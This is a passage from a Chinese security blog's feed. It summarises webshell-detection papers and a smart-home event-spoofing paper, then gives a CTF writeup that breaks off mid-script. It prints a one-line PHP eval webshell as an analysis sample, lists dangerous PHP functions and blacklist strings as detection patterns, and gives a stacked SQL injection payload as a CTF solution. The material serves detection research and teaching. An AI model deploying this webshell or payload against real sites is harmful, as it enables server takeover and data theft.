title="后记"></a>后记</h2><p>该工作将CNN和LSTM进行了结合，用于webshell检测，获得了不错的效果，同时分析了不同的因素对模型性能的影响，对后人工作具有一定的指导意义。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇paper来自ICMLC 2018，与前一篇文章《CNN-Webshell &amp;amp; Malicious Web Shell Dete
      
    
    </summary>
    
      <category term="paper" scheme="http://skysec.top/categories/paper/"/>
    
    
      <category term="paper" scheme="http://skysec.top/tags/paper/"/>
    
  </entry>
  
  <entry>
    <title>Paper Summary &amp; Detecting Webshell Based on Random Forest with FastText</title>
    <link href="http://skysec.top/2020/01/13/Paper-Summary-Detecting-Webshell-Based-on-Random-Forest-with-FastText/"/>
    <id>http://skysec.top/2020/01/13/Paper-Summary-Detecting-Webshell-Based-on-Random-Forest-with-FastText/</id>
    <published>2020-01-13T05:57:50.000Z</published>
    <updated>2020-06-11T00:56:42.990Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇paper来自ICCAI 2018，采用了fastText和随机森林算法相结合的模型FRF-WD，使用一些静态features和PHP opcode，对Webshell进行检测。但与之前的文章不同，本篇文章不再是基于HTTP流量检测，而是针对文件进行检测。</p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>Opcode是一种PHP脚本编译后的中间语言，对于PHP的语言引擎Zend执行代码，会经过如下4个步骤：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.Scanning(Lexing) ,将PHP代码转换为语言片段(Tokens)</span><br><span class="line">2.Parsing, 将Tokens转换成简单而有意义的表达式</span><br><span class="line">3.Compilation, 将表达式编译成Opocdes</span><br><span class="line">4.Execution, 顺次执行Opcodes，每次一条，从而实现PHP脚本的功能。</span><br></pre></td></tr></table></figure></p><p>而现有的一些工作已经表明，通过opcodes的频率可以区分恶意软件和可信软件。虽然PHP Opcode不同于恶意软件识别中使用的Opcode，但是他们在本质上是一致的，故此，本篇文章想要借助PHP Opcode来对恶意php webshell文件进行检测。<br>PHP拥有拓展Vulcan Logic Disassembler (VLD)，其可以hook Zend引擎，方便我们dump出所有的opcodes，例如如下一句话木马：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>如果我们运行该webshell，通过VLD，我们可以得到：<br><img src="/images/2020-01-13-14-28-06.png" alt=""><br>而作者正是想利用fastText和VLD得到的Opcode，训练文本分类器模型。</p><h2 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h2><p>FRF-WD模型对于文件的特征提取，可以分为两大步：</p><ol><li>分析提取文件的静态特征</li><li>利用PHP-VLD获取文件的Opcode，利用fastText训练文本分类器模型。<br>然后再利用上述获取的特征作为随机森林的输入，训练一个webshell检测模型。<h3 id="静态特征"><a href="#静态特征" class="headerlink" title="静态特征"></a>静态特征</h3>对于文件的静态特征，作者选取了如下5种：<br>1.长字符串<br>为了bypass现有的webshell检测，大多数的webshell会进行混淆，其惯用技术是利用编码，如base64，但其缺点就是对于一个较短的webshell，会经过编码，拼接变成一个很长的字符串。并且只检测php tag中的长字符串，可以有效避免富文本，js，图片，video或是css文件的干扰。<br>2.信息熵（Information Entropy）<br>由于内容加密会增加信息熵，所以计算信息熵是检测加密webshell的一个非常好的手段。<br>3.IC（Index of Coincidence）<br>IC在分析自然语言明文和密文中非常有用，如果IC值较低，那么表明文件中可能存在混淆或加密。<br>4.关键词搜索<br>如果文本文件中存在敏感词，诸如：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(), assert(), exec(), shell_exec(), passthru(), system(), show_source(), proc_open() and pcntl_exec()</span><br></pre></td></tr></table></figure></li></ol><p>则会被认为是一个可疑文件。<br>5.黑名单<br>如果文件中检测到诸如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">webshell by </span><br><span class="line">hack by</span><br><span class="line">bypass AV</span><br><span class="line">password is *</span><br><span class="line">etc .....</span><br></pre></td></tr></table></figure></p><p>那么可以认为其是一个可疑危险文件，因为一般正常文件的注释中不会存在这些语句。</p><h3 id="PHP-Opcode特征"><a href="#PHP-Opcode特征" class="headerlink" title="PHP Opcode特征"></a>PHP Opcode特征</h3><p>考虑到PHP文件可以利用PHP-VLD快速得到PHP Opcode，那么可以尝试使用文本分类器来识别webshell。在本文中选用了fastText模型来训练文本分类器。<br>fastText是一个快速文本分类算法，与基于神经网络的分类算法相比有两大优点：<br>1、fastText在保持高精度的情况下加快了训练速度和测试速度<br>2、fastText不需要预训练好的词向量，fastText会自己训练词向量<br>3、fastText两个重要的优化：Hierarchical Softmax、N-gram<br>同时，对于不同的文件，Opcode的数量可能只有少量，也可能有上千个，所以fastText比传统的深度学习方法TextCNN更适合处理这样的数据集。<br>工作大致分为3步：</p><ol><li>通过PHP-VLD，将PHP文件代码转化为PHP Opcode；</li><li>使用fastText和标记好的样本对文本分类器进行训练；</li><li>使用训练好的文本分类器去判断哪些标记过的文本来自PHP Opcode;<br>最终得到的预测值用于文件Opcode的特征值。<h3 id="分类器"><a href="#分类器" class="headerlink" title="分类器"></a>分类器</h3>在特征提取结束后，使用随机森林方法实现分类。<br>集成学习是通过建立几个模型组合的来解决单一预测问题。它的工作原理是生成多个分类器/模型，各自独立地学习和作出预测。这些预测最后结合成单预测，因此优于任何一个单分类的做出预测。<br>而随机森林是集成学习的一个子类，它依靠于决策树的投票选择来决定最后的分类结果。同时随机森林具有快速、高效、预测精度高等特点。同时其在生成过程中，能够获取到内部生成误差的一种无偏估计。<br><img src="/images/2020-01-13-15-24-43.png" alt=""></li></ol><h2 id="数据实验"><a href="#数据实验" class="headerlink" title="数据实验"></a>数据实验</h2><p>作者收集了共计8521个PHP文件，其中包括1587个PHP Webshell，其来自于github上一些webshell Project。对于正常文件来自于几个著名PHP框架，例如Yii2、Wordpress、CI等。<br>对于数据集，30%用于构建PHP Opcode文本分类器，70%用于随机森林的训练和模型测试。<br>为了证明FRF-WD模型的性能，作者使用了如下几个公式进行评估：<br>TP：True Positive<br>TP是正确分类为webshell文件的个数。<br>TN：True Negative<br>FN是错误分类为良性文件的webshell文件的个数。<br><img src="/images/2020-01-13-15-12-15.png" alt=""><br><img src="/images/2020-01-13-15-12-21.png" alt=""><br><img src="/images/2020-01-13-15-12-27.png" alt=""><br>由于在fastText模型中，word-Ngram是一个重要参数，为了找到最适合的N-gram，作者测试了n=1 ~ n=6，效果如下：<br><img src="/images/2020-01-13-15-16-02.png" alt=""><br>可见最佳的N-gram是4-gram。<br>同时作者比较了随机森林模型，和随机森林与fastText相结合的模型性能的差异：<br><img src="/images/2020-01-13-15-17-50.png" alt=""><br><img src="/images/2020-01-13-15-19-16.png" alt=""><br>可见在不考虑PHP Opcode特征下，随机森林的准确率仅为88.97%，而在FRF-WD模型下，准确数在97.92%。同时ROC曲线也能说明FRF-WD模型拥有更好的性能。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本文与之前的工作不同，之前的webshell检测使用了CNN对text进行分类，而本文则使用了fastText和随机森林结合的方式进行webshell检测。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.laruence.com/2008/06/18/221.html" target="_blank" rel="noopener">http://www.laruence.com/2008/06/18/221.html</a><br><a href="https://blog.csdn.net/feilong_csdn/article/details/88655927" target="_blank" rel="noopener">https://blog.csdn.net/feilong_csdn/article/details/88655927</a><br><a href="https://www.cnblogs.com/gczr/p/7097704.html" target="_blank" rel="noopener">https://www.cnblogs.com/gczr/p/7097704.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇paper来自ICCAI 2018，采用了fastText和随机森林算法相结合的模型FRF-WD，使用一些静态features和PHP 
      
    
    </summary>
    
      <category term="paper" scheme="http://skysec.top/categories/paper/"/>
    
    
      <category term="paper" scheme="http://skysec.top/tags/paper/"/>
    
  </entry>
  
  <entry>
    <title>Paper Summary &amp; CNN-Webshell &amp; Malicious Web Shell Detection with Convolutional Neural Network</title>
    <link href="http://skysec.top/2020/01/09/Paper-Summary-CNN-Webshell-Malicious-Web-Shell-Detection-with-Convolutional-Neural-Network/"/>
    <id>http://skysec.top/2020/01/09/Paper-Summary-CNN-Webshell-Malicious-Web-Shell-Detection-with-Convolutional-Neural-Network/</id>
    <published>2020-01-09T02:23:34.000Z</published>
    <updated>2020-06-11T00:56:46.770Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇paper来自ICNCC 2017，论文中指出，本篇文章是第一篇将CNN应用到恶意webshell检测上的文章。其对于webshell的检测主要集中于HTTP Requests检测。</p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>Webshell对网络服务会产生巨大的恶意作用，攻击者将Webshell上传至受害者服务器，达到持久化控制的目的。而本篇paper旨在检测恶意webshell，防止攻击者利用webshell进行二次攻击。<br>作者将检测放在HTTP Requests中，主要对用户的GET请求和POST请求进行检测分析。考虑到CNN在文本分类上已经有重大突破，工具word2vec在text分类上已经有比较好的效果，同时HTTP Requests流量和文本内容很相似，可以尝试将文本分类上比较成熟的方法应用于webshell检测。<br>但比较不同的是，HTTP Requests内容不同于普通的文本，它包含了许多的特殊符号，因此不能简单将word2vec迁移至HTTP Requests流量检测。</p><h2 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h2><p>因此可设计如下CNN-webshell模型，并从4个层面进行分析：</p><ul><li>数据输入层/ Input layer</li><li>卷积计算层/ CONV layer</li><li>ReLU激励层 / ReLU layer &amp; 池化层 / Pooling layer</li><li>全连接层 / FC layer<br><img src="/images/2020-01-10-11-06-09.png" alt=""><h3 id="数据输入层-Input-layer"><a href="#数据输入层-Input-layer" class="headerlink" title="数据输入层/ Input layer"></a>数据输入层/ Input layer</h3>在HTTP Requests流量中，文本没有空格进行分割，所以想要实现在文本分类上应用比较好的技术，首先需要进行词切分。<br>paper中指出，诸如中国菜刀的流量中，有如下特征：其对于每个参数字符串，有很多部分被<code>\&amp;</code>分割开，同时在流量中还有许多诸如：<code>( ) {  }  /  \  @</code>的符号，这些符号也可用于文本的分割。<br><img src="/images/2020-01-09-10-40-29.png" alt=""><br>例如如上中国菜刀流量，可以利用特殊符号将其分割成如上文本。然后将分割后的文本进行如下操作：<br>对于给定的一个单词i，给其对应的一个向量：<br><img src="/images/2020-01-10-10-38-45.png" alt=""><br>其中d为向量空间的维数。那么对于一个由n个单词组成的句子，它可以表示为如下矩阵：<br><img src="/images/2020-01-10-10-39-55.png" alt=""><br>这样一来，长度为n的句子，可以转化为大小为n<em>d的矩阵。同时，每一条句子的长度都规定为n，若不足n个单词的句子的会使用零向量进行补齐。如此一来，就可以得到n</em>d的矩阵输入。<h3 id="卷积计算层-CONV-layer"><a href="#卷积计算层-CONV-layer" class="headerlink" title="卷积计算层/ CONV layer"></a>卷积计算层/ CONV layer</h3>在这一个层，需要做局部关联，每个神经元看做一个滤波器filter：<br><img src="/images/2020-01-13-10-19-44.png" alt=""><br>此处h是滑动窗口的宽度，在当前环境里就是每次h个单词。此处使用的是1D卷积，即使用宽度为h的滑动窗口对每行进行卷积：<br><img src="/images/2020-01-13-11-15-57.png" alt=""><br>对于矩阵：<br><img src="/images/2020-01-13-10-20-49.png" alt=""><br>我们可以得到卷积结果为：<br><img src="/images/2020-01-13-10-21-07.png" alt=""><br>其中b是偏差，f是非线性校正函数。对于整个句子，其卷积结果是一个特征向量：<br><img src="/images/2020-01-13-10-22-11.png" alt=""><br>这一层我们可以简单理解，从输入的单词矩阵中提取features。<h3 id="ReLU激励层-ReLU-layer-amp-池化层-Pooling-layer"><a href="#ReLU激励层-ReLU-layer-amp-池化层-Pooling-layer" class="headerlink" title="ReLU激励层 / ReLU layer &amp; 池化层 / Pooling layer"></a>ReLU激励层 / ReLU layer &amp; 池化层 / Pooling layer</h3>在结束了卷积后，需要在feature map上选出最大值<img src="/images/2020-01-13-10-34-16.png" alt="">来作为和特定滤波器W对应的特征。<br>Max pooling的思想大致如下：<br><img src="/images/2020-01-13-13-51-33.png" alt=""><br>对于每个2<em>2的窗口选出最大的数作为输出矩阵的相应元素的值，比如输入矩阵第一个2</em>2窗口中最大的数是6，那么输出矩阵的第一个元素就是6，如此类推。<br>那么利用池化层获取的结果串联起来，得到特征向量Z：<br><img src="/images/2020-01-13-10-36-05.png" alt=""><br>再交由ReLU进行激活操作：<br><img src="/images/2020-01-13-10-37-24.png" alt=""><br>激励函数一般采用ReLU(The Rectified Linear Unit/修正线性单元)，原因是其收敛快，求梯度简单，但较脆弱。<br>在这一层中，我们可以简单理解成从众多的features中选出最有影响力的features，用以压缩数据和参数的量。<br><img src="/images/2020-01-13-16-38-34.png" alt=""><h3 id="全连接层-FC-layer"><a href="#全连接层-FC-layer" class="headerlink" title="全连接层 / FC layer"></a>全连接层 / FC layer</h3>两层之间所有神经元都有权重连接，通常全连接层在卷积神经网络尾部。也就是跟传统的神经网络神经元的连接方式是一样的：<br><img src="/images/2020-01-13-13-53-43.png" alt=""><br>在本层中，加入了Dropout来抑制过拟合问题。dropout是指在深度学习网络的训练过程中，对于神经网络单元，按照一定的概率将其暂时从网络中丢弃。每次做完dropout，相当于从原始的网络中找到一个更瘦的网络，如下图所示：<br><img src="/images/2020-01-13-10-47-14.png" alt=""><br>经过softmax函数后，结果输出是一个概率分布: 每个元素都是非负的, 并且所有元素的总和都是1。<br>softmax log-loss函数：<br><img src="/images/2020-01-13-10-51-32.png" alt=""><br>在本层中，我们可以理解为，在提取出众多的features后，我们需要做一个整合，对其进行权重划分，最后再进行判别。<h2 id="数据实验"><a href="#数据实验" class="headerlink" title="数据实验"></a>数据实验</h2>在实验部分，收集了如下数据集：3691个webshell，3990个正常样本。<br>实验中首先分析了工具word2vec的作用，word2vec生成的向量可用于度量词之间的相似性，我们从下图中可以看出，恶意操作词(webshell中常见的词)彼此非常接近，但正常的词则分散很远。<br><img src="/images/2020-01-09-10-40-14.png" alt=""><br>同时为了验证模型的性能，其与几种经典的分类器做了对比：</li><li>Naive Bayes (NB)</li><li>k-Near Neighbour (kNN)</li><li>Decision Tree (DT)</li><li>Support Vector Machine (SVM)</li><li>traditional Neural Network (NN) using the TF-IDF feature representation<br>所有的分类器都使用相同的feature。<br><img src="/images/2020-01-13-11-05-05.png" alt=""><br>同时考虑到向量空间的维度有显著的影响，可测试不同维数来评价其性能：<br><img src="/images/2020-01-13-11-10-35.png" alt=""><br>在维度200时，实现了最佳的性能。但是由于训练时间随维度增加而增加，还要考虑到效率问题。<br>同时实验也证明了模型训练过程可以快速收敛：<br><img src="/images/2020-01-13-11-27-56.png" alt=""><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2>本篇paper基于word2vec和CNN提出了一种新型检测WebShell的技术，同时和其他经典分类器相比，取得了最好的性能。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇paper来自ICNCC 2017，论文中指出，本篇文章是第一篇将CNN应用到恶意webshell检测上的文章。其对于webshell的
      
    
    </summary>
    
      <category term="paper" scheme="http://skysec.top/categories/paper/"/>
    
    
      <category term="paper" scheme="http://skysec.top/tags/paper/"/>
    
  </entry>
  
  <entry>
    <title>Paper Summary &amp; Peeves ：Physical Event Verification in Smart Homes</title>
    <link href="http://skysec.top/2020/01/09/Peeves%20&amp;%20Physical%20Event%20Verification%20in%20Smart%20Homes/"/>
    <id>http://skysec.top/2020/01/09/Peeves &amp; Physical Event Verification in Smart Homes/</id>
    <published>2020-01-09T02:23:34.000Z</published>
    <updated>2020-06-21T09:54:43.102Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次解读文章为2019 CCS的一篇paper《Peeves ：Physical Event Verification in Smart Homes》，主要介绍了一种防御IOT智能家具中事件欺骗的方式。同时作者提出了一种寻找最佳攻击点的方式。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="Event-Sensors"><a href="#Event-Sensors" class="headerlink" title="Event Sensors"></a>Event Sensors</h3><p>事件传感器可以用来提示某件物理事件的发生，例如：门关上了，灯打开了等等。</p><h3 id="Physical-Sensors"><a href="#Physical-Sensors" class="headerlink" title="Physical Sensors"></a>Physical Sensors</h3><p>物理传感器主要用来测量当前物理数据，例如光线传感器，气压传感器等等。</p><h3 id="Event-Spoofing"><a href="#Event-Spoofing" class="headerlink" title="Event Spoofing"></a>Event Spoofing</h3><p>在IOT设备中，存在一种攻击，称为Event Spoofing，其以攻击手段欺骗事件传感器，让其显示未发生的事情已发生，以达成进一步攻击的目的。<br>例如，在智能家居的设置中，必须要打开窗户，才会拉开窗帘。但是打开窗户必须要手动进行，攻击者不可能去打开受害者家中的窗户，那么怎么拉开窗帘呢？这里就需要进行Event Spoofing攻击，欺骗总控设备窗户已处于打开模式，然后让其打开窗帘。<br>那么这样的危害可想而知，作者在本篇paper中也提及了一些相关的攻击可能造成的危害性：<br><img src="/images/2019-12-26-16-28-52.png" alt=""><br>例如窗帘如果可以被攻击者控制，那么可以尝试进行光线的物理攻击，又或者可以进行间谍窥探活动。同理，如果窗户可以随意被打开，那么可能造成入室偷窃等问题。</p><h2 id="研究问题"><a href="#研究问题" class="headerlink" title="研究问题"></a>研究问题</h2><p>在本篇文章中，作者的核心问题不在于如何打开窗户或者如何拉开窗帘，而在于如何防止事件欺骗。<br>简单来说，即打开窗户的前置条件是家门被打开，主人已回家。那么攻击者想要打开窗户的前一件事，就是欺骗总控，家门已经被打开，主人已经回来。<br>那么作者这里要做的，就是判断事件传感器的判断是否为真，即家房到底有没有打开过。以此来防御Event Spoofing攻击。<br>那么作者如何进行验证呢？这里作者巧妙的应用了物理传感器，作者发现，不同事件的发生，都会对周围的物理数据产生不同的影响，例如图中：<br><img src="/images/2019-12-26-16-28-38.png" alt=""><br>当门打开和关闭后，都会对物理数据中：加速计、气压传感器、光线传感器产生比较明显的波动，那么即可利用物理数据来验证事件传感器判断的事件是否真实发生。</p><h2 id="攻击模型"><a href="#攻击模型" class="headerlink" title="攻击模型"></a>攻击模型</h2><p>在这里作者提出了两种攻击模型：</p><ul><li>Zero-effort攻击者 / 传感器故障</li><li>机会主义攻击者<br>对于Zero-effort攻击者，作者将其认为普通的攻击者，其对即将进行欺骗的设备没有做任何先前工作，也不能获取要攻击的设备的任何信息。其可以在任意时刻发起攻击。<br>而对于机会主义攻击者，作者认为其已经对攻击做足了准备，其可以获得即将进行欺骗的设备所有数据，同时其会精心的策划这次攻击。对于机会主义攻击者，其攻击的时机有2点要素：</li><li>最少的等待最佳攻击机会的时间</li><li>最大的攻击欺骗成功率<br>对于机会主义攻击者，其会尽量一击致命，而并非不断的进行攻击，暴露自己。<br>但无论哪种攻击者都不能修改物理传感器的数据。同时作者假定所有的测试使用的事件传感器都是不可信的，可以被欺骗的。<h2 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h2>为了验证想法，作者先提出如下定义：<br>事件源：事件的发生是由事件源产生，例如门开和门关，其事件源即门。<br>状态：每一个事件源都有多种状态，一般为两种，例如门有开和关两种状态。<br>然后作者布置了如下环境：<br><img src="/images/2019-12-26-16-29-07.png" alt=""><br>首先在房间中设置若干智能家居，并将其按照事件源分为若干组：<br><img src="/images/2019-12-26-16-29-23.png" alt=""><br>例如第8组中，门和门铃为一组；第9组中电脑、显示器等为一组。<br>那么为了验证事件发生对环境中的物理数据的影响，作者在环境中布置了13个树莓派，其信息设置如下：<br><img src="/images/2019-12-26-16-29-38.png" alt=""><br><img src="/images/2019-12-26-16-36-19.png" alt=""><br>不同的树莓派可能用以收集不同的信息，例如Pi #1，其会收集信息：A/G、P/T、L、S、R，这里的字母缩写定义如下：<br><img src="/images/2019-12-26-16-29-50.png" alt=""><br>那么可以得知，其搜集了温度、光线等等物理数据。而后作者进行了为期2周的数据收集。<h2 id="研究方法"><a href="#研究方法" class="headerlink" title="研究方法"></a>研究方法</h2>在收集2周的数据后，作者开始构建自己的工具，并进行数据测试，首先作者将数据分为3个部分：development、training、testing。<br>在development数据中，作者主要用来计算事件传感器的窗口期和feature的选择：<br>事件传感器的窗口期即一件事发生后，我们需要利用其前后一段事件的物理数据，那么这个窗口期设置的大小就至关重要，太大则不具备参考意义，同时不能体现出事件对物理数据的影响；太小则可能不能完全涵盖其影响的物理数据。<br>于是作者利用网格，标记出了不同窗口期的RMI值，其定义事件发生时间为t，发生之前的时间为t-，发生之后的时间为t+，那么对于某个事件的窗口期为：(t+t-,t+t+)。<br>比如对于门的关闭，光线的窗口期网格图如下：<br><img src="/images/2019-12-26-16-30-18.png" alt=""><br>我们不难发现，对于门关闭对光线传感器的影响，窗口期设为(-3,1)比较合适，其值达到最高的0.559。<br>而对于门关闭，加速计的窗口期网格图如下：<br><img src="/images/2019-12-26-16-30-34.png" alt=""><br>从图中也能看出，对于门关闭对加速计的影响，窗口期设为(0,4)比较合适，其值达到最高的0.523。<br>那么采用这样的方式，即可找出对于不同事件对应feature最佳的窗口期。<br>那么如何查找对于某一事件的发生，变化最大的feature呢？这里作者利用了RMI，对development数据进行评估计算。<br>其中RMI的公式如下：<br><img src="/images/2019-12-26-16-30-44.png" alt=""><br>H(A)为A的熵，H(A|B)为A在B情况下的熵。<br>而后作者对自己设置的所有智能家居涉及的feature进行熵计算：<br><img src="/images/2019-12-26-16-30-53.png" alt=""><br>我们不难发现，像是咖啡机的使用，会对电功率，加速计产生比较大的影响；而对于门的关闭，则加速计，光线等等都会有比较大的波动。<br>因此通过development数据集，作者可以确认，对于某一事件的发生，受到其影响最大的features有哪些，同时对应的feature应该设置多大的窗口期比较合适。<br>那么既然选定好窗口期和features，接下来就是使用机器学习，来使工具Peeves可以根据环境数据的变化，判断是否发生了事件。<br>那么对于机器学习，作者使用SVM作为分类器，并由于样本量比较大，同时有大量的features，作者使用了linear kernel。<br>同时作者还提出了机会主义者攻击的方法：</li></ul><ol><li>攻击者也仿照之前的方式，利用development数据集计算最佳的窗口期</li><li>然后选择相似的规则，去挑选分类器和features</li><li>攻击者在没有事件发生时，一直进行分类，寻找最佳攻击点<h2 id="研究结果"><a href="#研究结果" class="headerlink" title="研究结果"></a>研究结果</h2>作者使用了48个物理传感器验证了22个事件，在22个项目中有9个达到接近完美的能效比0.00%，其中15个事件在检测率超过99.9%时达到0%的误报率。<br><img src="/images/2019-12-26-16-37-00.png" alt=""><br>同时对于攻击者来说，Zero-effort攻击者的成功概率只有1%，而机会主义攻击者的成功率如下：<br><img src="/images/2019-12-26-16-46-13.png" alt=""><br>其中tto为等待攻击时间，SR为攻击成功率。同时作者发现冰箱、门窗事件的欺骗机会最容易找到。<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2>作者本篇paper的主要贡献为设计了一款利用物理数据验证事件是否真实发生的工具：Peeves，同时提出了一种强大的攻击模型，并验证了Peeves在这种攻击模型下依旧可以抵御攻击者的攻击。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本次解读文章为2019 CCS的一篇paper《Peeves ：Physical Event Verification in Smart H
      
    
    </summary>
    
      <category term="paper" scheme="http://skysec.top/categories/paper/"/>
    
    
      <category term="paper" scheme="http://skysec.top/tags/paper/"/>
    
  </entry>
  
  <entry>
    <title>2019 FudanCTF Writeup</title>
    <link href="http://skysec.top/2019/12/13/2019-FudanCTF-Writeup/"/>
    <id>http://skysec.top/2019/12/13/2019-FudanCTF-Writeup/</id>
    <published>2019-12-13T14:41:26.000Z</published>
    <updated>2019-12-14T04:36:17.616Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近学校有招新赛，难度比较低。于是节选了几道稍微有点意思的题目记录一下。</p><h2 id="你再注试试"><a href="#你再注试试" class="headerlink" title="你再注试试"></a>你再注试试</h2><p>本题是一道Web堆叠查询注入题，改编自2019 强网杯online 随便注，在其基础上限制了多个关键词：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prepare、set、execute……</span><br></pre></td></tr></table></figure></p><p>但是我们可以利用mysql新特性handler：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dev.mysql.com/doc/refman/8.0/en/handler.html</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-12-14-12-09-03.png" alt=""><br>例如：<br><img src="/images/2019-12-14-12-31-18.png" alt=""><br>我们可以用如下方式查询：<br><img src="/images/2019-12-14-12-33-23.png" alt=""><br>最后写出exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11&apos;; handler `1919810931114514` open as `tgt`;handler `tgt` read next;--</span><br></pre></td></tr></table></figure></p><h2 id="ReSnAd"><a href="#ReSnAd" class="headerlink" title="ReSnAd"></a>ReSnAd</h2><p>本题是一道密码题，涉及RSA相关知识。题目提供了如下值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phi_n、iqmp、ipmq、e、c</span><br></pre></td></tr></table></figure></p><p>首先我们看一下各个变量的定义：<br><img src="/images/2019-12-13-23-04-59.png" alt=""><br>那么现在即考虑，如何利用iqmp和ipmq推导出p和q，首先将式5、6变为等式：<br><img src="/images/2019-12-13-23-08-11.png" alt=""><br>我们将两式相乘得到：<br><img src="/images/2019-12-13-23-10-34.png" alt=""><br>那么即：<br><img src="/images/2019-12-13-23-10-48.png" alt=""><br>移项化简：<br><img src="/images/2019-12-13-23-11-33.png" alt=""><br>同时我们知道k1和k2的范围：<br><img src="/images/2019-12-13-23-14-21.png" alt=""><br>那么可以转换为这样一个问题，在极限情况k1和k2均取右边值时，会出现如下情况：<br><img src="/images/2019-12-13-23-24-35.png" alt=""><br>但显然不等式右边肯定小于2n+1，那么x的取值只能为1或2，但是如果x取2，那么除非k1取q，k2取p，否则不等式将不成立，但这显然不可能取得。所以x只能为1，那么我们得到式子：<br><img src="/images/2019-12-13-23-28-05.png" alt=""><br>那么我们将最初的式5、6相加：<br><img src="/images/2019-12-13-23-29-58.png" alt=""><br>而我们知道：<br><img src="/images/2019-12-13-23-30-49.png" alt=""><br>展开后得到：<br><img src="/images/2019-12-13-23-31-53.png" alt=""><br>那么可以得到phi_n和n的关系式如下：<br><img src="/images/2019-12-13-23-32-32.png" alt=""><br>我们将其带入等式：<br><img src="/images/2019-12-13-23-29-58.png" alt=""><br>得到：<br><img src="/images/2019-12-13-23-34-24.png" alt=""><br>那么可以联立方程组：<br><img src="/images/2019-12-13-23-35-53.png" alt=""><br>那么可以构成一组二元二次方程。为约束求解方便，我们可以利用换元法，做一下代换：<br><img src="/images/2019-12-13-23-37-19.png" alt=""><br>替换后得到：<br><img src="/images/2019-12-13-23-40-22.png" alt=""><br>那么我们将x带入消元，再将式子两边同乘y：<br><img src="/images/2019-12-13-23-43-44.png" alt=""><br>我们化简后得到：<br><img src="/images/2019-12-13-23-45-53.png" alt=""><br>如此一来，即化简成了一元二次方程组问题，那么我们可以用z3来求解：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">Y = Int(<span class="string">'Y'</span>)</span><br><span class="line">phi = <span class="number">11177929896833318778267064419554047209804133035532602158237892469506082395935495256139136112194510151728917586404919115707761109072628761295860181662822356164160284726297946695851442119129722147684494637497443200139538149832495961915450185804086755272971387407998204100589137627495400914243828434106078332327997903842841517071021248147779935078071506489655500155896938283840729728572328660647233974344849571246788826036265850539775145330135792207209473452843737567371694666658091855216070403504619639510901644370971614286091867701992201923071041178318790575030522483839410855929335515391080189720203086802888683798400</span></span><br><span class="line">iqmp = <span class="number">91015809392527255523072044687980286577671138545257803641612547883387289541035388722157767029686572001797549231630088970758132893695316792508265294751302240594796242084165161239587935396541914404832318478070695600559420277875549100164011180835754613742632525637982101603421982448705454195363628987806367263766</span></span><br><span class="line">ipmq = <span 